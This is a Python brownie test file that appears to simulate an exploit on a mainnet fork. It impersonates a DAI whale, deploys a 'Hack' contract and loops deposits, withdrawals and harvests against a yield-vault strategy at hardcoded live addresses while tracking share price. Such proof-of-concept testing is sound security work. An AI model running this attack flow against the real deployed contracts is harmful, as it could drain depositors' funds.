import pytest
import brownie
from brownie import Wei, accounts, Contract, config, Hack


def test_hack(
    chain,
    gov,
    user,
    amount,
):
    strategy = Contract("0x79a9242EF351d1cC9927c683Eb1b23bCd74D8fAc") #Contract("0xEAFB3Ee25B5a9a1b35F193A4662E3bDba7A95BEb")
    vault = Contract(strategy.vault())
    strategist = strategy.strategist()

    token = Contract("0x6B175474E89094C44Da98b954EedeAC495271d0F")

    whale = accounts.at("0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503", force=True)

    hack = user.deploy(Hack)
    token.transfer(hack, 10_000_000*10**18, {"from": whale})
    print(f"bal: {token.balanceOf(hack)/1e18:_}")
    print(f"pps: {vault.pricePerShare()/1e18:_}")

    hack.deposit({"from": user})
    print(f"bal: {token.balanceOf(hack)/1e18:_}")
    print(f"pps: {vault.pricePerShare()/1e18:_}")

    token.transfer(strategy, Wei("10000 ether"), {"from": whale})
    assert token == strategy.want()
    print(strategy.estimatedTotalAssets() / 1e18)
    print(token.balanceOf(strategy) / 1e18)
    #assert False


    # Get profits and withdraw
    tx = strategy.harvest({"from": strategist})
    profit = tx.events['Harvested']['profit']
    print(f"profit: {profit/1e18:_}")
    print(f"locked profit: {vault.lockedProfit()/1e18:_}")
    chain.sleep(3600 * 6)
    chain.mine(1)

    #assert vault.pricePerShare() > before_pps
    
    print(f"bal: {token.balanceOf(hack)/1e18:_}")
    print(f"pps: {vault.pricePerShare()/1e18:_}")
    print(f"share value: {(vault.pricePerShare() * vault.balanceOf(hack) / 1e18)/1e18:_}")
    hack.loop(10, {"from": user})
    print(f"bal: {token.balanceOf(hack)/1e18:_}")
    print(f"pps: {vault.pricePerShare()/1e18:_}")
    
    hack.deposit({"from": user})
    hack.loop(10, {"from": user})
    print(f"bal: {token.balanceOf(hack)/1e18:_}")
    print(f"pps: {vault.pricePerShare()/1e18:_}")
    
    hack.deposit({"from": user})
    hack.loop(10, {"from": user})
    print(f"bal: {token.balanceOf(hack)/1e18:_}")
    print(f"pps: {vault.pricePerShare()/1e18:_}")
    #assert vault.pricePerShare() > before_pps
    #assert user_end_balance > user_start_balance

def test_clone_hack(
    chain,
    gov,
    token,
    strategist,
    rewards,
    keeper,
    strategy,
    Strategy,
    vault,
    bento_box,
    kashi_pairs,
    pids,
    user,
    amount,
    reserve,
):
    strategy = Contract("0x79a9242EF351d1cC9927c683Eb1b23bCd74D8fAc") #Contract("0xEAFB3Ee25B5a9a1b35F193A4662E3bDba7A95BEb")
    new_strategy = strategy
    vault = Contract(strategy.vault())
    strategist = strategy.strategist()
    gov = vault.governance()

    token = Contract("0x6B175474E89094C44Da98b954EedeAC495271d0F")

    whale = accounts.at("0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503", force=True)

    token.transfer(user, 1_000_000*1e18, {"from": whale})

    user_start_balance = token.balanceOf(user)
    before_pps = vault.pricePerShare()
    token.approve(vault.address, 2**256-1, {"from": user})
    vault.deposit({"from": user})

    token.transfer(new_strategy, 10_000 * 10 ** token.decimals(), {"from": whale})

    # Get profits and withdraw
    print(before_pps)
    before_pps = vault.pricePerShare()
    new_strategy.harvest({"from": gov})
    chain.sleep(3600 * 6)
    chain.mine(1)
    #assert vault.pricePerShare() > before_pps
    
    before_pps = vault.pricePerShare()
    print(vault.pricePerShare())
    vault.withdraw({"from": user})

    for i in range(200):
        print(f"pps: {vault.pricePerShare()/1e6:_}")
        print(f"bal: {token.balanceOf(user)/1e6:_}")
        vault.deposit({"from": user})
        print(f"pps: {vault.pricePerShare()/1e6:_}")
        vault.withdraw({"from": user})

    print(f"pps: {vault.pricePerShare()/1e6:_}")

    #assert vault.pricePerShare() > before_pps
    #assert user_end_balance > user_start_balance
